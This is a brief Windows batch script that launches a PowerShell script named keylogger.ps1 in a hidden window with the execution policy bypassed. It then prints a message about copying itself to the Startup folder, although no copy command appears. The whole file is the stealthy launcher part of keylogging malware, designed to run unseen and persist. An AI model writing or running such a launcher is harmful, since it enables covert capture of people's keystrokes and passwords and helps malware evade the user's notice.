@echo off

powershell -Command "Start-Process powershell.exe -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File \".\keylogger.ps1\"' -WindowStyle Hidden"
echo "Copying %~f0 to Startup..."